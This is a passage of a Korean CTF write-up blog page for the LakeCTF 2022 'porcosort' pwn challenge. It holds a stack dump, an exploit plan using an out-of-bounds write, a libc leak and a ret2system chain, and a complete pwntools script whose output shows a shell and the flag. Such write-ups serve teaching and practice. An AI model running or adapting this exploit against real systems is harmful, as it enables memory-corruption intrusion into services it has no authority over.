+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe3265c040:	0x8000000000006873	0x8000000000006873</span><br><span class="line">0x7ffe3265c050:	0x8000000000006873	0x8000000000006873</span><br><span class="line">0x7ffe3265c060:	0x8000000000006873	0x8000000000006873</span><br><span class="line">0x7ffe3265c070:	0x8000000000006873	0x8000000000006873</span><br><span class="line">...</span><br><span class="line">0x7ffe3265c190:	0x8000000000006873	0x8000000000006873</span><br><span class="line">0x7ffe3265c1a0:	0x8000000000006873	0x8000000000006873</span><br><span class="line">0x7ffe3265c1b0:	0x8000000000006873	0x8000000000006873</span><br><span class="line">0x7ffe3265c1c0:	0xa3d3707cd6109c68	0xa614ed753417eb00 // 0x7ffe3265c1c8: canary</span><br><span class="line">0x7ffe3265c1d0:	0x0000000000000000	0x0000000000000039</span><br><span class="line">0x7ffe3265c1e0:	0x0000562e91ec649e	0x00007f29d786a1d6 // 0x7ffe3265c1e8: ret address</span><br><span class="line">0x7ffe3265c1f0:	0x00007f29d788ca40	0x00007f29d7a406c0 // 0x7ffe3265c1f0: system address</span><br><span class="line">0x7ffe3265c200:	0x00007ffe3265c240	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>현재 카나리는 <code>0x7ffe3265c1c8</code> 주소에 위치한다.</p>
+<p>익스를 작성할 때 가장 까다로운 점은 카나리의 값이 랜덤이란 점이다. 이 위치가 바뀌면 당연하게도 <code>*** stack smashing detected ***: terminated</code>이 발생하는데, 카나리의 값은 랜덤이기 때문에 적당히 작은 수(음수?)이길 기대해야 한다. 이 때문에 익스 코드는 확률이 조금 있다.</p>
+<p>그리고 <code>0x8000000000006873</code>가 보이는데 이는 <code>-9223372036854749069</code> 이다. 사실은 <code>sh</code>을 의도한 문자열이다. 왜 이렇게 줬을까?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x56310fe0d428 &lt;vuln+294&gt;    call   get_gnomed                &lt;get_gnomed&gt;</span><br><span class="line">       rdi: 0x7ffe3265c040 —▸ 0x7f4d54ba36c0 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">       rsi: 0x39</span><br><span class="line">       rdx: 0x39</span><br><span class="line">       rcx: 0x0</span><br></pre></td></tr></table></figure>
+
+<p><code>get_gnomed</code> 함수를 호출할 떄 rdi의 값은 <code>0x7ffe3265c040</code>이다. 이 함수에서 <code>rdi</code>를 쓰지 않기 때문에 함수가 종료될 때도 rdi가 동일하다.</p>
+<p>그렇단 뜻은 <code>system</code> 함수를 실행할 때 내가 원하는 매우 작은 값으로 <code>rdi</code>로 지정할 수 있단 뜻</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="시나리오"><a href="#시나리오" class="headerlink" title="시나리오"></a>시나리오</h3><ol>
+<li>OOB write 트리거 위해 <code>cnt</code> 입력 시 48 입력</li>
+<li><code>_IO_2_1_stdout_</code> 출력해주는 것을 이용하여 libc base 구하기</li>
+<li>정렬할 값들을 적을 때(스택에 값을 적을 때) <code>cnt</code>를 더 큰 수로 하기 위해 맨 처음 57 입력 &lt;- OOB write 트리거 됨</li>
+<li>스택에 페이로드 입력: ret 가젯 필요 (<code>movaps xmmword ptr [rsp + 0x50], xmm0</code>에서 멈추기 때문)</li>
+<li>카나리의 위치가 제 위치에 온전히 있을 수 있도록 기도</li>
+</ol>
+<p>여담이지만 <code>ret</code> 주소가 <code>system</code> 주소보다 작게 구해졌기 때문에 이거에 대한 크기 고민은 하지 않았다.</p>
+<h3 id="가젯-찾기"><a href="#가젯-찾기" class="headerlink" title="가젯 찾기"></a>가젯 찾기</h3><h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ROPgadget --binary libc.so.6 | grep &quot; : ret&quot;</span><br><span class="line">0x00000000000291d6 : ret</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./porcosort&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.polygl0ts.ch&#x27;, 3900)</span></span><br><span class="line">e= ELF(<span class="string">&#x27;./porcosort&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./ld-linux-x86-64.so.2&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sh += <span class="string">&quot;sh\x00&quot;</span>.ljust(<span class="number">7</span>, <span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;\x80&#x27;</span></span><br><span class="line">p.send(sh * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;leak :: &#x27;</span>+ <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;sort? &#x27;</span>, <span class="built_in">str</span>(<span class="number">48</span>)) <span class="comment"># it caused an oob write</span></span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x291d6</span> <span class="comment">#0x29cd6</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = [<span class="number">57</span>, ret, system] <span class="comment"># 57: sort count overwriting</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span> - <span class="built_in">len</span>(payload)):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(-<span class="number">9223372036854749069</span>)) <span class="comment"># input 0x8000000000006873</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] leak :: 0x7fb8ce4466c0</span><br><span class="line">[*] libc base :: 0x7fb8ce247000</span><br><span class="line">[57, 140431709372886, 140431709514304]</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(jail) gid=1000(jail) groups=1000(jail)</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">run</span><br><span class="line">$ cat flag</span><br><span class="line">EPFL&#123;https://www.youtube.com/watch?v=2HjspVV0jK4&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#tmi"><span class="toc-number">1.</span> <span class="toc-text">tmi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EB%A1%9C%EC%BB%AC%EC%97%90%EC%84%9C-%EB%AC%B8%EC%A0%9C-%ED%99%98%EA%B2%BD-%EC%84%B8%ED%8C%85%ED%95%98%EA%B8%B0-feat-%EB%8F%84%EC%BB%A4%ED%8C%8C%EC%9D%BC%EC%9D%B4-%EC%A3%BC%EC%96%B4%EC%A1%8C%EC%9D%84-%EB%95%8C-libc-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0"><span class="toc-number">2.1.</span> <span class="toc-text">로컬에서 문제 환경 세팅하기 (feat. 도커파일이 주어졌을 때 libc 가져오기)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95"><span class="toc-number">2.2.</span> <span class="toc-text">보호 기법</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EC%B7%A8%EC%95%BD%EC%A0%90"><span class="toc-number">2.3.</span> <span class="toc-text">취약점</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#vuln-%ED%95%A8%EC%88%98"><span class="toc-number">2.3.1.</span> <span class="toc-text">vuln 함수</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#read-numbers-%ED%95%A8%EC%88%98"><span class="toc-number">2.3.2.</span> <span class="toc-text">read_numbers 함수</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-gnomed-%ED%95%A8%EC%88%98"><span class="toc-number">2.3.3.</span> <span class="toc-text">get_gnomed 함수</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4"><span class="toc-number">3.1.</span> <span class="toc-text">시나리오</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EA%B0%80%EC%A0%AF-%EC%B0%BE%EA%B8%B0"><span class="toc-number">3.2.</span> <span class="toc-text">가젯 찾기</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret"><span class="toc-number">3.2.1.</span> <span class="toc-text">ret</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.3.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">3.4.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/lakectf2022-porcosort/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/lakectf2022-porcosort/&text=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/lakectf2022-porcosort/&title=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/lakectf2022-porcosort/&is_video=false&description=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)&body=Check out this article: https://jiravvit.github.io/lakectf2022-porcosort/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/lakectf2022-porcosort/&title=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/lakectf2022-porcosort/&title=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/lakectf2022-porcosort/&title=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/lakectf2022-porcosort/&title=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/lakectf2022-porcosort/&name=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/lakectf2022-porcosort/&t=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
